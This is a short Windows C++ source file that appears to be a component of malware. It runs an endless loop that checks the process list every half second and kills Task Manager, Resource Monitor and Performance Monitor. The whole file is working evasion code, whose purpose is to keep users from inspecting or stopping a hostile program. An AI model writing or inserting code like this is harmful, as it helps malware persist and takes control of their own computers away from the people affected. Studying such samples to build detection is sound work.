#include "Common.hpp"
#include <TlHelp32.h>

static const std::string TaskList[] = {
	"Taskmgr.exe",
	"resmon.exe",
	"perfmon.exe",
};

void CloseProcesses() {
	while (true) {
		for (const auto& processName : TaskList) {
			if (!processName.empty()) {
				HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
				if (hSnapshot == INVALID_HANDLE_VALUE) continue;
				
				PROCESSENTRY32 pe;
				pe.dwSize = sizeof(PROCESSENTRY32);

				if (Process32First(hSnapshot, &pe)) {
					do {
						if (strcmp(pe.szExeFile, processName.c_str()) == 0) {
							HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
							if (hProcess != NULL) if (TerminateProcess(hProcess, 0));
						}
					} while (Process32Next(hSnapshot, &pe));
				}

				CloseHandle(hSnapshot);
			}
		}
		Sleep(500);
	}
}
